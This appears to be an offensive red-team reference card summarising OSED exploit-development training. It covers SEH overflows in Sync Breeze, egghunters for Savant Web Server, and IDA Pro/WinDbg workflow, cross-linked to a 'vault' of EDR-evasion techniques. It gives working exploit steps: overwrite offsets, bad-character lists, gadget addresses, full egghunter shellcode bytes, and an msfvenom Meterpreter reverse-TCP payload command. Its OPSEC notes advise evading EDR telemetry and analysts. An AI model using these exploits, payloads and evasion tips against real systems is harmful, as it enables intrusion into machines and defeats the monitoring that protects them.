---
id: RTO-osed-exploit-dev-foundations
name: OSED Exploit Development Foundations — SEH Overflows, IDA Pro & Egghunters
source: OSED / Offensive Security (Zero-Point Security Red Team Ops cross-reference)
category: exploit-development
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T-001, T-002, T-003, T-016, T-020, T-021]
tags: [seh-overflow, egghunter, exploit-dev, x86-assembly, windbg, ida-pro, shellcode, system-calls, partial-eip-overwrite, island-hopping, keystone-engine, ppr-sequence, bad-characters, savant, sync-breeze]
---

# OSED Exploit Development Foundations — Training Reference

## TL;DR
This module consolidates three foundational OSED topics: (1) exploiting Structured Exception Handler (SEH) overflows in Sync Breeze Enterprise via P/P/R sequences and short-jump island hopping, (2) using IDA Pro as a static analysis companion to WinDbg dynamic analysis, and (3) writing/fixing egghunters (both `NtAccessCheckAndAuditAlarm` syscall-based and SEH-based variants) to overcome space restrictions on the Savant Web Server target. The vault's syscall/exception-handler machinery (T-001 RecycledGate, T-002 Hell's Gate, T-003 VEH Gate, T-016 EDR Suite/KiUserException StepOver) is the direct modern successor to the syscall/SEH primitives abused here — operators should treat this training as the conceptual root for those advanced cards.

## Key Concepts

1. **SEH (Structured Exception Handler) Mechanism** — Windows x86 stores a singly-linked list of `_EXCEPTION_REGISTRATION_RECORD {Next, Handler}` structures at the head of each thread's TEB (`fs:[0x00]` = `ExceptionList`). When an exception fires, `ntdll!KiUserExceptionDispatcher` → `RtlDispatchException` walks the list and dispatches each registered handler with a `CONTEXT*` pointer (offset 0xB8 = `Eip`). This is the same mechanism the vault's T-003 VEH Gate and T-016 KiUserException StepOver manipulate at a higher level of sophistication.

2. **SafeSEH Mitigation & Bypass** — Modules compiled with `/SAFESEH` have a verified-handler table; modules without it (e.g., `libspp.dll`, `Savant.exe`) can supply arbitrary `POP R32; POP R32; RET (P/P/R)` gadgets that the SEH dispatcher will happily call. The `narly` WinDbg extension (`!nmod`) lists `/SafeSEH`, `/GS`, `*ASLR`, `*DEP` flags per loaded module to find unprotected candidates.

3. **Partial EIP Overwrite** — When a target module base begins with `0x00` (e.g., `Savant.exe` at `0x00400000`) and the buffer is treated as a null-terminated string, the trailing null byte naturally becomes the high-order byte of EIP — overwrite only the low 3 bytes (`\x42\x42\x42`) to redirect execution into the module without truncating earlier buffer content.

4. **Island Hopping in Assembly** — After SEH overwrite, execution lands on the bytes composing the P/P/R address itself (NSEH region). Use a short jump (`0xEB + offset`, with `0x06` being the typical jump-over-SEH-address value) to skip past the P/P/R pointer and reach controlled buffer space. The `a` command in WinDbg assembles instructions inline to extract opcodes.

5. **Stack Pointer Adjustment via `add sp, 0x830; jmp esp`** — When shellcode lives far down the stack, a small bootstrap stub (`66 81 C4 30 08` for `add sp,0x830` followed by `FF E4` for `jmp esp`) avoids null bytes that a 32-bit `add esp,0x830` would introduce. Using the 16-bit `sp` form is the operator's trick.

6. **Egghunter Concept** — A small first-stage payload that walks the entire process VAS searching for a unique 8-byte ASCII egg (e.g., `w00tw00t`), then jumps to the payload that follows it. Used when the corruption gives only a tiny controlled buffer but a larger secondary buffer is stored elsewhere (commonly the heap).

7. **Syscall-Based Egghunter (`NtAccessCheckAndAuditAlarm`)** — Original Matt Miller egghunter uses `INT 0x2E` with syscall number `0x02` (pre-Win8) in EAX and a candidate page address in EDX. The OS attempts to copy args from user-space and returns `STATUS_ACCESS_VIOLATION (0xc0000005)` for unmapped pages, `STATUS_NO_IMPERSONATION_TOKEN (0xc000005c)` for valid pages. The hunter checks only the low byte (`cmp al,05`) to avoid null bytes. The vault's T-002 Hell's/Halo's/Tartarus Gate solves the exact portability problem (SSN changing per Windows build) with a 4-stage cascade.

8. **SEH-Based Egghunter (Portable Variant)** — Installs a custom `_EXCEPTION_REGISTRATION_RECORD` on the stack and overwrites `fs:[0]` (TEB ExceptionList) with a pointer to it. The custom handler dereferences `ContextRecord` (3rd arg at `[esp+0x0C]`), modifies `CONTEXT.Eip` (offset `0xB8`) by `+0x06` to redirect execution to the `loop_inc_page` function, then returns `ExceptionContinueExecution (0)`. Roughly 60 bytes vs 35 for syscall variant but version-independent.

9. **Static-Dynamic Synchronization (Rebasing IDA)** — `Edit > Segments > Rebase program...` in IDA Pro to the runtime module base (from `lm m <module>` in WinDbg) allows jumping between debugger and disassembler using absolute addresses (`g` jump-to-address hotkey).

10. **Keystone Engine** — Python-bindings assembler (`Ks(KS_ARCH_X86, KS_MODE_32)`) that lets you write shellcode inline in Python and emit opcodes directly, replacing the edit-compile-disassemble loop. Note: short jumps may be mis-assembled — always verify in WinDbg.

## Operational Techniques

### SEH Overflow Exploitation (Sync Breeze Enterprise)
- **What**: Overwrite the SEH handler pointer with a P/P/R gadget from an unprotected module, then island-hop through NSEH into a controlled shellcode buffer.
- **When to use**: When the target has `/SafeSEH OFF` modules and a stack-resident buffer overruns past an `_except_handler` registration. Sync Breeze Enterprise `libpal!SCA_ConfigObj::Deserialize` was the vulnerable path.
- **How**:
  1. Trigger access violation with cyclic pattern; identify SEH overwrite offset via `!exchain` (124 bytes for Sync Breeze).
  2. Detect bad chars: `\x00, \x02, \x0A, \x0D, \xF8, \xFD`.
  3. Load `narly` (`.load narly`), run `!nmod`, pick a `/SafeSEH OFF` module with no null bytes in base address (`libspp.dll @ 0x10000000-0x10226000` chosen).
  4. Run the `find_ppr.wds` script (`$><C:\Users\offsec\Desktop\find_ppr.wds`) to enumerate P/P/R candidates; first hit `0x1015a2f0` (`pop eax; pop ebx; ret`) is clean.
  5. Build NSEH short jump: `\x90\x90\xeb\x06` (assemble in WinDbg with `a <addr>` then `jmp <target>` to extract opcodes).
  6. Stack-alignment stub after SEH pointer: `\x90\x90` + `66 81 C4 30 08` (add sp, 0x830) + `FF E4` (jmp esp).
  7. Generate Meterpreter shellcode with `msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode`, prepend 20-byte NOP sled for decoder breathing room.
- **Vault link**: T-016 EDR Evasion Suite covers `KiUserExceptionDispatcher StepOver` — the same dispatcher this exploit subverts from the *outside*. T-021 Crypto & Obfuscation provides shellcode encoders (IPv4/IPv6/MAC/UUID/words) superior to msfvenom's `-b` for the bad-char-constrained payload problem.
- **Tool/code**: `msf-nasm_shell`, `narly` WinDbg extension, `msfvenom`, Metasploit handler (`use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp`).
- **OPSEC**: Meterpreter reverse TCP leaves 180KB stage artifact in memory; pivot quickly. Sync Breeze listens on TCP 9121 — pre-auth exploit, no creds required.

### WinDbg P/P/R Script Automation
- **What**: A `.wds` WinDbg classic script that searches a given module range for `POP R32; POP R32; RET` sequences across all 7 non-ESP register combinations.
- **When to use**: Any SEH overflow where you need a gadget candidate list — manual `s` searches per register pair are tedious.
- **How**:
  ```
  .block{
    .for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01) {
      .for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01) {
        s-[1]b 10000000 10226000 $t0 $t1 c3
      }
    }
  }
  ```
  Invoke via `$><path\find_ppr.wds`. The opcodes `0x58-0x5F` cover `pop eax/ebx/ecx/edx/esi/edi/ebp` — `pop esp (0x5C)` should be excluded to avoid stack corruption.
- **Vault link**: T-020 Anti-Analysis Suite covers IAT camouflage and API hammering; the same WinDbg scripting tradecraft applies to verifying evasion chains.
- **Tool/code**: WinDbg classic scripts, pseudo-registers `$t0`/`$t1`, `.block` for alias scoping, `s-[1]b` (byte search, addresses only).
- **OPSEC**: Pure static analysis — no runtime footprint on target.

### IDA Pro Static-Dynamic Synchronization
- **What**: Rebase IDA Pro's database to the runtime module base so absolute addresses match between disassembler and debugger.
- **When to use**: Any time you need to follow execution flow in IDA while debugging in WinDbg — essential for tracing large functions where stepping is disorienting.
- **How**:
  1. In WinDbg: `lm m <module>` → note `start` address (e.g., `00f20000` for notepad).
  2. In IDA Pro: `Edit > Segments > Rebase program...` → enter the new image base.
  3. Use `g` (Jump to address) to navigate to any address shown in WinDbg.
  4. Use `x` (cross-references) to find all callers of an API (e.g., `CreateFileW`) — for notepad this returned 20 candidates.
  5. To narrow: in WinDbg, `bp kernel32!CreateFileW; g; pt` (execute to return), then read the return address in caller; cross-reference that address in IDA.
- **Vault link**: T-020 Anti-Analysis Suite — the IAT camouflage profiles assume the analyst uses exactly this static-dynamic workflow. Knowing how an analyst works is the foundation for evading them.
- **Tool/code**: IDA Pro Freeware 7.0 (`idafree70_linux.run`), symlink `/opt/idafree-7.0/ida64` to `/usr/bin`. WinDbg `bp`, `pt` (step to return), `p` (step over), `u` (unassemble), `da`/`db`/`dds`/`dc` (memory display).
- **OPSEC**: IDA Freeware is non-commercial — for engagement work, licensed IDA Pro is the operator standard. Saving IDA database: always tick `Pack database` on close or lose analysis state.

### Egghunter — Syscall-Based Variant
- **What**: A 35-byte first-stage shellcode that walks the process VAS probing each page for validity via `NtAccessCheckAndAuditAlarm` syscall, then scans valid pages for the egg pattern and jumps to the secondary payload.
- **When to use**: When the corruption buffer is too small (~253 bytes after jump) for a full Meterpreter stage (~400+ bytes) but a larger secondary buffer is reliably stored in heap memory.
- **How**:
  1. Identify a secondary buffer location that survives the crash — Savant allows a payload after `\r\n\r\n` HTTP terminator to land in a heap allocation (confirmed via `s -a 0x0 L?80000000 w00tw00t`).
  2. Confirm it's heap (not stack) via `!address <addr>` → `Usage: Heap`.
  3. Build the egghunter via Keystone (see code in Listing 50): page-walk (`or dx, 0x0fff; inc edx`), syscall probe (`push 0x2; pop eax; int 0x2e; cmp al,05`), egg scan (`mov eax, 0x74303077; scasd; jnz; scasd; jnz; jmp edi`).
  4. **Windows 10 fix**: original `0x02` syscall number is stale — query with `u ntdll!NtAccessCheckAndAuditAlarm` → `mov eax, 1C6h` (varies per build).
  5. **Null-byte avoidance**: replace `push 0x1C6` (introduces nulls) with `mov eax, 0xfffffe3a; neg eax` → produces `0x1C6` without nulls.
  6. Prepend an 8-byte NOP sled to the egghunter to absorb landing imprecision.
- **Vault link**: T-002 Hell's/Halo's/Tartarus Gate solves the same SSN-portability problem at industrial scale with a 4-stage resolution cascade (FreshyCalls → Hell's Gate → Halo's Gate → Tartarus Gate by Zw* RVA sort). T-001 RecycledGate dispatches syscalls indirectly through ntdll gadgets rather than `INT 0x2E`, evading EDR telemetry hooks. **The egghunter approach here is fundamentally obsolete against modern EDR** — operators should use T-002/T-001 syscall primitives for any post-2020 target.
- **Tool/code**: Keystone Engine (`pip install keystone-engine`), WinDbg `u ntdll!NtAccessCheckAndAuditAlarm`.
- **OPSEC**: The `INT 0x2E` instruction is a loud legacy syscall path — modern EDRs flag it. The 100% CPU spin during VAS walk is visible in Task Manager. Stage in parallel with cover process activity. The heap-located secondary buffer can be garbage-collected — race the GC.

### Egghunter — SEH-Based Portable Variant
- **What**: A 60-byte egghunter that installs a custom SEH handler via direct `fs:[0]` (TEB ExceptionList) overwrite, using the handler to gracefully resume scanning on access violations instead of relying on a syscall.
- **When to use**: When portability across Windows versions matters more than size — the SEH mechanism internals are far more stable across builds than syscall numbers. Required when target has unpredictable Windows version.
- **How**:
  1. Bootstrap position-independent addressing: `jmp get_seh_address` → `call build_exception_record` (negative relative call to avoid null bytes; pushes return addr).
  2. `pop ecx` retrieves handler address; `mov eax, 0x74303077` loads egg.
  3. Build fake `_EXCEPTION_REGISTRATION_RECORD` on stack: `push ecx` (Handler), `push 0xffffffff` (Next = -1, list terminator).
  4. Install: `xor ebx,ebx; mov dword ptr fs:[ebx], esp` — overwrites TEB ExceptionList with our stack pointer.
  5. Scan with `REPE SCASD` (counter in ECX = 2) — triggers access violation on unmapped pages, dispatches to our handler.
  6. Custom handler (`_except_handler` signature):
     - Retrieve `ContextRecord` (3rd arg, `[esp+0x0C]`).
     - `mov cl, 0xB8` → offset of `Eip` in CONTEXT.
     - `add dword ptr ds:[eax+ecx], 0x06` → bump Eip forward to `loop_inc_page` instruction.
     - `xor eax,eax; ret` → returns `ExceptionContinueExecution`.
  7. Opcodes via Keystone: `\xeb\x21\x59\xb8\x77\x30\x30\x74\x51\x6a\xff\x31\xdb\x64\x89\x23\x6a\x02\x59\x89\xdf\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3`
- **Vault link**: T-003 VEH Gate uses a similar pattern (HW breakpoint → VEH handler → syscall dispatch) but operates through `AddVectoredExceptionHandler` rather than direct `fs:[0]` manipulation. T-016 KiUserException StepOver directly manipulates `KiUserExceptionDispatcher` flow. The CONTEXT.Eip edit pattern (offset 0xB8) is exactly the primitive both vault cards leverage.
- **Tool/code**: Keystone Engine for opcode generation; WinDbg `dt ntdll!_CONTEXT` and `dt _EXCEPTION_DISPOSITION` for structure layout verification; `!exchain` to verify handler installation.
- **OPSEC**: This variant **fails on modern Windows** because `RtlDispatchException` calls `RtlpGetStackLimits` and validates the SEH record lies within stack bounds `[StackLimit, StackBase]` before reaching `RtlIsValidHandle` (which performs SafeSEH checks). The handler's stack address is checked against TEB StackBase/StackLimit — operators must ensure their fake record lives in valid stack range. Additionally, SafeSEH on the host module would block the handler address entirely. For modern targets, use T-003 VEH Gate instead.

### Partial EIP Overwrite
- **What**: Overwrite only the low 3 bytes of EIP and rely on the null terminator of the string-terminated buffer to provide the high byte.
- **When to use**: When the only module available is the main executable, and its base contains `0x00` as the high byte (e.g., `Savant.exe @ 0x00400000`).
- **How**:
  1. Confirm the buffer is null-terminated (inspect crash state: `dds @esp L4` should show trailing `00`).
  2. Send only 3 bytes where EIP overwrite would normally be (`inputBuffer+= b"\x42\x42\x42"`).
  3. Choose a low-3-byte target inside the module — for Savant, search for `POP EAX; RET` (`58 C3`) inside `0x00400000-0x00452000`: `s -[1]b 00400000 00452000 58 c3` → candidates like `0x00418674`.
  4. Proof: post-crash `eip=00424242` confirms the null byte became the high byte.
- **Vault link**: No direct vault equivalent — this is a target-specific exploit primitive. T-016 EDR evasion's PEB unlinking uses a similar "use an existing null" trick for null-terminated string APIs.
- **Tool/code**: `msf-nasm_shell` for opcode lookup, WinDbg `s -[1]b <start> <end> <opcodes>`.
- **OPSEC**: Limitation: nothing past the partial EIP overwrite can contain data — the null truncates it. All shellcode must live *before* the overwrite address (counterintuitive for typical overflows).

### HTTP Method Buffer Reuse for Bootstrap Shellcode
- **What**: Replace the HTTP method bytes (e.g., `GET`) with custom opcodes; the server stores the method in a separate zeroed allocation that survives the corruption.
- **When to use**: When you need a few bytes of bootstrap (e.g., conditional jump) and the main overflow buffer is too constrained or zero-truncated.
- **How**:
  1. Confirm Savant accepts any byte sequence as "method" (`httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"` — `xor ecx,ecx; test ecx,ecx; je 0x17`).
  2. The `0x17` offset skips past the null padding to the controlled `0x41` buffer.
  3. Note: short jump `0xEB` gets mangled in this separate allocation (different bad chars than the main buffer!) — must use conditional jumps (`JE` = `0F 84 xx xx xx xx`) and rely on pre-zeroed bytes for the high offsets.
- **Vault link**: T-020 Anti-Analysis Suite's IAT camouflage profiles manipulate similar per-allocation byte constraints — knowing that different allocations have different bad-char sets is critical tradecraft.
- **Tool/code**: `msf-nasm_shell` for `xor ecx,ecx` (`31C9`), `test ecx,ecx` (`85C9`), `je 0x17` (`0F8411000000`).
- **OPSEC**: Each allocation in a target may have **different bad characters** — must probe each separately. Always re-verify even after a "complete" bad-char list for the main buffer.

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `msf-pattern_create` / `msf-pattern_offset` | Cyclic pattern for offset determination | Sometimes triggers different crash (Savant case) — split-buffer manual method as fallback |
| `msf-nasm_shell` | One-off assembly opcode lookup | Kali local; no network traffic |
| `msfvenom -p ... -b "\x00\x0a..." -f python -v shellcode` | Bad-char-constrained payload generation | 180KB Meterpreter stage in memory post-exec |
| `pip install keystone-engine` | Python assembler framework | Replaces edit-compile-disassemble loop |
| WinDbg `.load narly; !nmod` | Module protection enumeration (`/SafeSEH`, `/GS`, `*ASLR`, `*DEP`) | Static analysis only |
| WinDbg `$><script.wds` | Execute classic script | `.wds` extension conventional but not required |
| WinDbg `s -[1]b <start> <end> <bytes>` | Byte search, addresses only | `-[1]` flag suppresses content display |
| WinDbg `!exchain` | Inspect current exception handler chain | Verifies SEH overwrite success |
| WinDbg `!address <addr>` | Memory region info (Usage, State, Protect, Type) | Distinguishes heap/stack/private |
| WinDbg `!teb` | TEB dump (ExceptionList, StackBase, StackLimit) | Required for SEH-record-in-stack validation |
| WinDbg `dt ntdll!_CONTEXT` | CONTEXT structure layout (Eip @ +0xB8) | Required for handler Eip manipulation |
| WinDbg `dt _EXCEPTION_DISPOSITION` | Exception handler return values | `ExceptionContinueExecution = 0` |
| WinDbg `u ntdll!Nt*` | Resolve syscall number from ntdll stub (`mov eax, <SSN>`) | SSN changes per Windows build |
| IDA Pro `Edit > Segments > Rebase program` | Match database to runtime base | May break debug symbols if compiled with debug info |
| IDA Pro `g` | Jump to address | Static-dynamic sync workflow |
| IDA Pro `x` | Cross-references | `CreateFileW` in notepad: 20 hits — needs narrowing via WinDbg |
| IDA Pro `n` | Rename function/variable | All references auto-update |
| IDA Pro `E+m` / `C+m` | Bookmark set / bookmark list | Persistent across IDB sessions |
| IDA Pro `T` | Toggle graph/text view | Line prefixes via `Options > General` |

## Gaps & Extensions

**Training covers that the vault does not:**
- Classic memory-corruption exploit development (stack overflows, SEH overflows, partial EIP overwrite, island hopping) — the vault assumes execution primitives already exist (shellcode/PE loaders) and focuses on modern post-exploitation evasion.
- The full WinDbg operator workflow (`.wds` scripting, `narly` extension, breakpoint scripting, `pt`/`ph`/`t`/`p` distinction).
- IDA Pro operator tradecraft (rebasing, xref narrowing, color coding, bookmark discipline).
- The original 2004 Miller egghunter — historically foundational for understanding how modern syscall-walking payloads evolved.
- The `REPE SCASD` instruction for compact double-egg scanning (vault's syscall cards use Rust loops, not assembly tricks).

**Vault covers that this training does not:**
- **T-001 RecycledGate**: Indirect syscall dispatch via ntdll gadget — the proper modern answer to the `INT 0x2E` telemetry problem exposed in the egghunter module. Operators reading this training should immediately upgrade to RecycledGate for any syscall use.
- **T-002 Hell's/Halo's/Tartarus Gate**: 4-stage SSN resolution cascade — directly solves the "syscall number changes per Windows build" problem that broke the original egghunter. The training's `mov eax, 0xfffffe3a; neg eax` trick is a hand-rolled, target-specific solution; the vault's cascade is automatic and portable.
- **T-003 VEH Gate**: Vectored exception handler mediated syscalls — the modern, SafeSEH-proof successor to the SEH-based egghunter. The training's SEH egghunter fails on modern Windows because `RtlDispatchException` validates SEH records against stack bounds and SafeSEH tables before invoking the handler; `AddVectoredExceptionHandler` (T-003) bypasses these checks entirely.
- **T-016 KiUserException StepOver**: Direct manipulation of `KiUserExceptionDispatcher` to skip handler invocations — a more surgical approach than installing a fake handler.
- **T-020 Anti-Analysis Suite**: 10 anti-VM checks, FPU/SIMD API hammering (3M iterations), IAT camouflage profiles — none of which appear in this training.
- **T-021 Crypto & Obfuscation**: Shellcode encoders (IPv4/IPv6/MAC/UUID/words) far superior to `msfvenom -b` for bad-char evasion; AES-GCM+zstd pipeline; Ethereum TX signing.

**Specific areas where the training is outdated or superseded:**
- The `INT 0x2E` syscall path is a loud EDR signal on modern Windows; `sysenter` (used by ntdll post-XP) and `syscall` (x64) are the modern paths. **Operators should never use `INT 0x2E` against EDR-protected targets.**
- The original syscall-based egghunter breaks on Windows 10+ due to SSN churn — the SEH-based variant breaks on SafeSEH-protected modules and `RtlDispatchException`'s stack-bounds validation. **Both are obsolete against modern targets; use T-002 for SSN resolution and T-001/T-003 for dispatch.**
- The 35-byte vs 60-byte size tradeoff is irrelevant on modern x64 where REX prefixes and SSN-stomping defenses make hand-rolled assembly a liability.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| SEH mechanism theory (`_EXCEPTION_REGISTRATION_RECORD`, TEB `ExceptionList`) | T-003 VEH Gate | Vault uses VEH (vectored) handlers — the SEH-immune successor; same `CONTEXT*` manipulation primitive |
| `INT 0x2E` direct syscall | T-001 RecycledGate | Vault dispatches indirectly via ntdll gadget — avoids EDR `INT 0x2E` telemetry hook |
| `NtAccessCheckAndAuditAlarm` SSN hardcoding (`0x02` pre-Win8, `0x1C6` on Win10) | T-002 Hell's/Halo's/Tartarus Gate | Vault's 4-stage SSN cascade auto-resolves per-build; training's `neg eax` trick is target-specific |
| Custom SEH handler installation via `fs:[0]` overwrite | T-003 VEH Gate | Vault uses `AddVectoredExceptionHandler` — immune to SafeSEH and stack-bounds checks |
| `CONTEXT.Eip` modification (offset `0xB8`) | T-016 KiUserException StepOver | Both manipulate CONTEXT/Eip; vault uses it to skip dispatcher, training uses it to resume egghunter |
| Bad character filtering via `msfvenom -b` | T-021 Crypto & Obfuscation | Vault's IPv4/IPv6/MAC/UUID/words encoders are far more capable for bad-char-constrained buffers |
| Stack-resident shellcode bootstrap (`add sp, 0x830; jmp esp`) | T-013 Remaining Injection / Reflective PE loader | Vault assumes shellcode execution primitive exists; this training builds it from scratch |
| P/P/R sequence discovery (WinDbg `find_ppr.wds`) | None directly | Vault doesn't cover ROP/gadget discovery — assumes operator has execution primitive |
| Partial EIP overwrite | None directly | Target-specific primitive; vault's NtCreateUserProcess (T-014) is the modern process-creation equivalent |
| Static-dynamic IDA/WinDbg synchronization | T-020 Anti-Analysis Suite | Vault's IAT camouflage and anti-VM checks assume the analyst uses this exact workflow |
| Egghunter VAS walking for buffer location | T-007 Pool Party / T-012 Early Cascade | Vault's injection techniques position payload at predictable addresses — eliminates the egghunter need |
| `_except_handler` 4-arg prototype (ExceptionRecord, EstablisherFrame, ContextRecord, DispatcherContext) | T-003 VEH Gate | Same handler signature; vault's VEH handler is a strict subset (no EstablisherFrame) |
| `RtlDispatchException` → `RtlpGetStackLimits` → stack-bounds validation | T-016 KiUserException StepOver | Vault's StepOver technique operates at this exact dispatcher layer |
| `Keystone Engine` for inline shellcode assembly | T-021 Crypto & Obfuscation (shellcode encoding CLI) | Vault's encoder CLI accepts raw bytes; Keystone useful as pre-encoder for raw assembly |